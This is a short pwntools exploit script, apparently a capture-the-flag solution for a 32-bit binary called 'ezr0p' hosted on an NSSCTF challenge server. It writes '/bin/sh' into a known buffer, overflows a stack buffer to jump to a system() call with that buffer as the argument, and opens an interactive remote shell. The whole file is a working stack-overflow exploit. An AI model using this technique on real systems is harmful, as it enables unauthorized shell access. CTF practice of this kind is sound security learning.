from pwn import *

context(arch="i386", os="linux", log_level="info")
context.gdb_binary = "/bin/pwndbg"

buf_addr = 0x0804A080
call_sys_addr = 0x8048562
ret_addr = 0x8048386
payload1 = b"/bin/sh\x00"
payload2 = b'a' * (0x1c+4) + p32(call_sys_addr)+ p32(buf_addr)

#io = process("./ezr0p")

io = remote("node5.anna.nssctf.cn", 24614)

io.sendlineafter(b"name", payload1)
io.sendlineafter(b"time~", payload2)

io.interactive()
